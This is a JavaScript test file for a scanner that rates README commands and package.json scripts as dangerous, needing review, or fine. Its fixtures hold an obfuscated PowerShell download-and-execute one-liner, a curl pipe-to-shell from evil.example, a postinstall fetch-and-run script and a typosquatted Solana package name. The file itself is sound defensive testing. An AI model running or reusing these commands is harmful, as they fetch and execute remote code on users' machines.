import test from "node:test"; import assert from "node:assert/strict";
import { scanText, scanPackageJson, verdict } from "../src/core.js";
test("SolanaCry one-liner is dangerous", () => { const f = scanText(`powershell -Command "$update='developer'; $mode='-upd'; $key='ate'; $file='indicator';  $url=$update+$mode+$key+'.app/update/'+$file;&{ iex ([System.Text.Encoding]::UTF8.GetString((iwr $url -UseBasicParsing).Content)) }"`, "README.md"); assert.equal(verdict(f), "dangerous"); });
test("known installers are fine", () => assert.equal(verdict(scanText("curl -L https://foundry.paradigm.xyz | bash\nsh -c \"$(curl -sSfL https://release.anza.xyz/stable/install)\"")), "no_red_flags"));
test("unknown pipe-to-shell needs review", () => assert.equal(verdict(scanText("curl -s https://evil.example/x.sh | bash")), "review_before_running"));
test("postinstall fetch + typosquat", () => { const f = scanPackageJson(JSON.stringify({ scripts: { postinstall: "curl https://x.y/a|sh" }, dependencies: { "@solana/web3js": "1", react: "18", preact: "10" } })); assert.deepEqual(f.map((x) => x.code), ["install_script_network_exec", "dependency_typosquat"]); });
